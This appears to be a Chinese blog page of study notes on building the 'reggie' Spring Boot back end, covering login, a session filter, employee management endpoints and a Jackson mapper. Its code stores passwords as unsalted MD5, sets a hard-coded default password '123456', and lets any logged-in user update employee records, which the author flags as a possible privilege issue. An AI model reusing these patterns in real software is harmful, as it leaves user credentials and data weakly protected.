class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="attr">id-type:</span> <span class="string">ASSIGN_ID</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reggie:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">D:\\reggie_img\\</span></span><br></pre></td></tr></table></figure>



<h3 id="mysql配置"><a href="#mysql配置" class="headerlink" title="mysql配置"></a>mysql配置</h3><p>密码为root</p>
<h3 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">registry.addResourceHandler(&quot;/backend/**&quot;).addResourceLocations(&quot;classpath:/backend&quot;);</span><br><span class="line">registry.addResourceHandler(&quot;/front/**&quot;).addResourceLocations(&quot;classpath:/front&quot;);</span><br><span class="line">log.info(&quot;配置springMvc成功&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="业务开发"><a href="#业务开发" class="headerlink" title="业务开发"></a>业务开发</h2><h3 id="后台系统登录业务"><a href="#后台系统登录业务" class="headerlink" title="后台系统登录业务"></a>后台系统登录业务</h3><p>访问controller后流程：Controller&#x3D;&gt;Service&#x3D;&gt;Mapper&#x3D;&gt;DB</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ol>
<li><p>新建实体类Employee</p>
</li>
<li><p>新建mapper EmployeeMapper，继承自BaseMapper<Employee></p>
</li>
<li><p>新建接口 EmployeeService</p>
</li>
<li><p>新建EmployeeServiceImpl extends ServiceImpl&lt;EmployeeMapper, Employee&gt; implements EmployeeService</p>
</li>
<li><p>新建EmployeeController</p>
</li>
<li><p>新建统一返回类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">R</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer code; <span class="comment">//编码：1成功，0和其它数字为失败</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String msg; <span class="comment">//错误信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T data; <span class="comment">//数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">//动态数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; R&lt;T&gt; <span class="title function_">success</span><span class="params">(T object)</span> &#123;</span><br><span class="line">        R&lt;T&gt; r = <span class="keyword">new</span> <span class="title class_">R</span>&lt;T&gt;();</span><br><span class="line">        r.data = object;</span><br><span class="line">        r.code = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; R&lt;T&gt; <span class="title function_">error</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">R</span>();</span><br><span class="line">        r.msg = msg;</span><br><span class="line">        r.code = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> R&lt;T&gt; <span class="title function_">add</span><span class="params">(String key, Object value)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>开发登录接口</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240624143258336.png" alt="image-20240624143258336" style="zoom: 80%;" /></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span> (<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"><span class="keyword">public</span> R&lt;Employee&gt; <span class="title function_">login</span><span class="params">(HttpServletRequest request, <span class="meta">@RequestBody</span> Employee employee)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> employee.getPassword();</span><br><span class="line">    password = DigestUtils.md5DigestAsHex(password.getBytes());</span><br><span class="line">    LambdaQueryWrapper&lt;Employee&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(Employee::getUsername,employee.getUsername());</span><br><span class="line">    <span class="type">Employee</span> <span class="variable">emp</span> <span class="operator">=</span> employeeService.getOne(queryWrapper);</span><br><span class="line">    <span class="keyword">if</span>(emp == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!emp.getPassword().equals(password))&#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(emp.getStatus() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(<span class="string">&quot;账号已禁用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    request.getSession().setAttribute(<span class="string">&quot;employee&quot;</span>,emp.getId());</span><br><span class="line">    <span class="keyword">return</span> R.success(emp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="后台系统退出"><a href="#后台系统退出" class="headerlink" title="后台系统退出"></a>后台系统退出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    public R&lt;String&gt; logout(HttpServletRequest request)&#123;</span><br><span class="line">//        log.info(request.getSession().getAttribute(&quot;employee&quot;).toString());</span><br><span class="line">        request.getSession().removeAttribute(&quot;employee&quot;);</span><br><span class="line">        return R.success(&quot;退出成功&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="登录功能完善"><a href="#登录功能完善" class="headerlink" title="登录功能完善"></a>登录功能完善</h3><p>一般来说通过拦截器或过滤器实现</p>
<p><strong>过滤器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;loginCheckFilter&quot;, urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginCheckFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">AntPathMatcher</span> <span class="variable">PATH_MATCHER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntPathMatcher</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line"><span class="comment">//        log.info(&quot;拦截到请求&#123;&#125;&quot;, request.getRequestURI());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">        String[] urls = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;/employee/login&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/employee/logout&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/backend/**&quot;</span>,</span><br><span class="line">                <span class="string">&quot;/front/**&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">checked</span> <span class="operator">=</span> check(urls, requestURI);</span><br><span class="line">        <span class="keyword">if</span> (checked) &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (request.getSession().getAttribute(<span class="string">&quot;employee&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        log.info(<span class="string">&quot;未登录&quot;</span>);</span><br><span class="line">        response.getWriter().write(JSON.toJSONString(R.error(<span class="string">&quot;NOTLOGIN&quot;</span>)));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String[] urls, String requestURI)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (String url : urls) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">match</span> <span class="operator">=</span> PATH_MATCHER.match(url, requestURI);</span><br><span class="line">            <span class="keyword">if</span> (match) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拦截器一般用来处理静态资源</p>
<p><a href="https://blog.csdn.net/xinzhifu1/article/details/106356958">过滤器 和 拦截器的 6个区别，别再傻傻分不清了_拦截器和过滤器的区别-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/feiying0canglang/article/details/120678900">Spring工具类–路径匹配(AntPathMatcher)–使用&#x2F;实例-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/zouyang920/article/details/107163539">@ServletComponentScan注解的作用-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/hbiao68/article/details/103622917">springboot @RequestBody注解学习_springboot requestbody-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/hbiao68/article/details/87364112">springboot controller接收参数_spring controller get param-CSDN博客</a></p>
<h3 id="新增员工"><a href="#新增员工" class="headerlink" title="新增员工"></a>新增员工</h3><h4 id="业务代码"><a href="#业务代码" class="headerlink" title="业务代码"></a>业务代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@PostMapping</span><br><span class="line">public R&lt;String&gt; save(HttpServletRequest request, @RequestBody Employee employee)&#123;</span><br><span class="line">    employee.setPassword(DigestUtils.md5DigestAsHex(&quot;123456&quot;.getBytes()));</span><br><span class="line">    employee.setCreateTime(LocalDateTime.now());</span><br><span class="line">    employee.setUpdateTime(LocalDateTime.now());</span><br><span class="line">    Long empId = (Long) request.getSession().getAttribute(&quot;employee&quot;);</span><br><span class="line">    employee.setCreateUser(empId);</span><br><span class="line">    employee.setUpdateUser(empId);</span><br><span class="line">    employeeService.save(employee);</span><br><span class="line">    log.info(&quot;新增员工:&#123;&#125;&quot;,employee.toString());</span><br><span class="line">    return R.success(&quot;新增员工成功&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://baomidou.com/guides/data-interface/">持久层接口 | MyBatis-Plus (baomidou.com)</a></p>
<h4 id="全局异常处理"><a href="#全局异常处理" class="headerlink" title="全局异常处理"></a>全局异常处理</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@ControllerAdvice(annotations = &#123;RestController.class, Controller.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line">    <span class="meta">@ExceptionHandler(SQLIntegrityConstraintViolationException.class)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;String&gt; <span class="title function_">ExceptionHandler</span><span class="params">(SQLIntegrityConstraintViolationException ex)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ex.getMessage().contains((<span class="string">&quot;Duplicate entry&quot;</span>)))&#123;</span><br><span class="line">            String[] split = ex.getMessage().split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> split[<span class="number">2</span>] + <span class="string">&quot;已存在&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> R.error(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_36829919/article/details/101210250">@ControllerAdvice 的介绍及三种用法-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_36829919/article/details/101210250">@ControllerAdvice 的介绍及三种用法-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_43842093/article/details/122269772">SQLIntegrityConstraintViolationException: 异常解决-CSDN博客</a></p>
<h3 id="员工信息分页查询"><a href="#员工信息分页查询" class="headerlink" title="员工信息分页查询"></a>员工信息分页查询</h3><h4 id="mybatis-plus插件配置"><a href="#mybatis-plus插件配置" class="headerlink" title="mybatis-plus插件配置"></a>mybatis-plus插件配置</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisPlusConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">mybatisPlusInterceptor</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">MybatisPlusInterceptor</span> <span class="variable">mybatisPlusInterceptor</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">        mybatisPlusInterceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">PaginationInnerInterceptor</span>());</span><br><span class="line">        <span class="keyword">return</span> mybatisPlusInterceptor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="业务代码-1"><a href="#业务代码-1" class="headerlink" title="业务代码"></a>业务代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/page&quot;)</span><br><span class="line">public R&lt;Page&gt; page(int page, int pageSize,String name)&#123;</span><br><span class="line">    log.info(&quot;page=&#123;&#125;,pageSize=&#123;&#125;,name=&#123;&#125;&quot;,page, pageSize, name);</span><br><span class="line">    Page pageInfo = new Page(page, pageSize);</span><br><span class="line">    LambdaQueryWrapper&lt;Employee&gt; queryWrapper = new LambdaQueryWrapper();</span><br><span class="line">    queryWrapper.like(StringUtils.isNotEmpty(name) ,Employee::getName, name);</span><br><span class="line">    queryWrapper.orderByDesc(Employee::getUpdateTime);</span><br><span class="line">    employeeService.page(pageInfo,queryWrapper);</span><br><span class="line">    return R.success(pageInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="启用、禁用员工账号"><a href="#启用、禁用员工账号" class="headerlink" title="启用、禁用员工账号"></a>启用、禁用员工账号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@PutMapping</span><br><span class="line">public R&lt;String&gt; update(HttpServletRequest request, @RequestBody Employee employee)&#123;</span><br><span class="line">    log.info(employee.toString());</span><br><span class="line">    Long empId = (Long) request.getSession().getAttribute(&quot;employee&quot;);</span><br><span class="line">    employee.setUpdateUser(empId);</span><br><span class="line">    employee.setUpdateTime(LocalDateTime.now());</span><br><span class="line">    employeeService.updateById(employee);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<p>存在问题：前端js处理返回的id丢失精度</p>
<p><a href="https://blog.csdn.net/Mr1ght/article/details/118178664">long类型返回前端精度丢失_long类型前端丢失精度-CSDN博客</a>（阿里巴巴开发手册有，看来还是比较专业）</p>
<p>处理方法：将long统一转为字符串 <a href="https://blog.csdn.net/A1916403680/article/details/126679473">对象映射器（项目必备）_java对象映射器-CSDN博客</a></p>
<p>具体实现步骤:<br>1)提供对象转换器jackson0bjectMapper，基于jackson进行]ava对象到json数据的转换(资料中已经提供，直接复制到<br>项目中使用</p>
<p>2)在WebMvcConfig配置类中扩展Spring mvc的消息转换器，在此消息转换器中使用提供的对象转换器进行}ava对象到ison数据的转换</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xccStu.riggie.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.DeserializationFeature;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.<span class="keyword">module</span>.SimpleModule;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ser.std.ToStringSerializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.deser.LocalDateDeserializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.deser.LocalDateTimeDeserializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.deser.LocalTimeDeserializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.ser.LocalDateSerializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.ser.LocalDateTimeSerializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.ser.LocalTimeSerializer;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDate;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalTime;</span><br><span class="line"><span class="keyword">import</span> java.time.format.DateTimeFormatter;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.fasterxml.jackson.databind.DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对象映射器:基于jackson将Java对象转为json，或者将json转为Java对象</span></span><br><span class="line"><span class="comment"> * 将JSON解析为Java对象的过程称为 [从JSON反序列化Java对象]</span></span><br><span class="line"><span class="comment"> * 从Java对象生成JSON的过程称为 [序列化Java对象到JSON]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonObjectMapper</span> <span class="keyword">extends</span> <span class="title class_">ObjectMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_DATE_FORMAT</span> <span class="operator">=</span> <span class="string">&quot;yyyy-MM-dd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_DATE_TIME_FORMAT</span> <span class="operator">=</span> <span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_TIME_FORMAT</span> <span class="operator">=</span> <span class="string">&quot;HH:mm:ss&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JacksonObjectMapper</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="comment">//收到未知属性时不报异常</span></span><br><span class="line">        <span class="built_in">this</span>.configure(FAIL_ON_UNKNOWN_PROPERTIES, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化时，属性不存在的兼容处理</span></span><br><span class="line">        <span class="built_in">this</span>.getDeserializationConfig().withoutFeatures(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">SimpleModule</span> <span class="variable">simpleModule</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleModule</span>()</span><br><span class="line">                .addDeserializer(LocalDateTime.class, <span class="keyword">new</span> <span class="title class_">LocalDateTimeDeserializer</span>(DateTimeFormatter.ofPattern(DEFAULT_DATE_TIME_FORMAT)))</span><br><span class="line">                .addDeserializer(LocalDate.class, <span class="keyword">new</span> <span class="title class_">LocalDateDeserializer</span>(DateTimeFormatter.ofPattern(DEFAULT_DATE_FORMAT)))</span><br><span class="line">                .addDeserializer(LocalTime.class, <span class="keyword">new</span> <span class="title class_">LocalTimeDeserializer</span>(DateTimeFormatter.ofPattern(DEFAULT_TIME_FORMAT)))</span><br><span class="line"></span><br><span class="line">                .addSerializer(BigInteger.class, ToStringSerializer.instance)</span><br><span class="line">                .addSerializer(Long.class, ToStringSerializer.instance)</span><br><span class="line">                .addSerializer(LocalDateTime.class, <span class="keyword">new</span> <span class="title class_">LocalDateTimeSerializer</span>(DateTimeFormatter.ofPattern(DEFAULT_DATE_TIME_FORMAT)))</span><br><span class="line">                .addSerializer(LocalDate.class, <span class="keyword">new</span> <span class="title class_">LocalDateSerializer</span>(DateTimeFormatter.ofPattern(DEFAULT_DATE_FORMAT)))</span><br><span class="line">                .addSerializer(LocalTime.class, <span class="keyword">new</span> <span class="title class_">LocalTimeSerializer</span>(DateTimeFormatter.ofPattern(DEFAULT_TIME_FORMAT)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//注册功能模块 例如，可以添加自定义序列化器和反序列化器</span></span><br><span class="line">        <span class="built_in">this</span>.registerModule(simpleModule);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>分析：可能有越权问题，普通员工猜测接口（很容易猜测接口名字太常见了）进而修改自己或者他人禁用状态或其它信息</p>
<p>todo： 如果最后视频都没有修改，尝试自己处理下。</p>
<h3 id="编辑员工信息"><a href="#编辑员工信息" class="headerlink" title="编辑员工信息"></a>编辑员工信息</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Employee&gt; <span class="title function_">getByID</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span>&#123;</span><br><span class="line">    <span class="type">Employee</span> <span class="variable">employee</span> <span class="operator">=</span> employeeService.getById(id);</span><br><span class="line">    <span class="keyword">if</span>(employee == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(<span class="string">&quot;没有查到员工信息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> R.success(employee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分类管理业务-公共字段自动填充"><a href="#分类管理业务-公共字段自动填充" class="headerlink" title="分类管理业务-公共字段自动填充"></a>分类管理业务-公共字段自动填充</h3><p>实现步骤:<br>1、在实体类的属性上加入@TableField注解，指定自动填充的策略<br>2、按照框架要求编写元数据对象处理器，在此类中统一为公共字段赋值，此类需要实现MetaObjectHandler接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xccStu.riggie.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.FieldFill;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableField;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String idNumber;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer status;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime createTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Long createUser;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Long updateUser;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>元数据对象处理器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMetaObjecthandler</span> <span class="keyword">implements</span> <span class="title class_">MetaObjectHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line"><span class="comment">//        log.info(&quot;自动填充&quot;);</span></span><br><span class="line"><span class="comment">//        log.info(metaObject.toString());</span></span><br><span class="line">        metaObject.setValue(<span class="string">&quot;createTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;createUser&quot;</span>, <span class="keyword">new</span> <span class="title class_">Long</span>(<span class="number">1</span>));</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateUser&quot;</span>, <span class="keyword">new</span> <span class="title class_">Long</span>(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateUser&quot;</span>, <span class="keyword">new</span> <span class="title class_">Long</span>(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在问题，无法获取session对象获取修改用户id。解决方法，使用threadLocal</p>
<p>新建BaseContext类，在filter里面赋值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class BaseContext &#123;</span><br><span class="line">    private static  ThreadLocal&lt;Long&gt; threadLocal = new ThreadLocal&lt;&gt;();</span><br><span class="line">    public static void setCurrentId(Long id)&#123;</span><br><span class="line">        threadLocal.set(id);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Long getCurrentId()&#123;</span><br><span class="line">        return threadLocal.get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (request.getSession().getAttribute(<span class="string">&quot;employee&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Long</span> <span class="variable">empId</span> <span class="operator">=</span> (Long) request.getSession().getAttribute(<span class="string">&quot;employee&quot;</span>);</span><br><span class="line">    BaseContext.setCurrentId(empId);</span><br><span class="line">    filterChain.doFilter(request, response);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

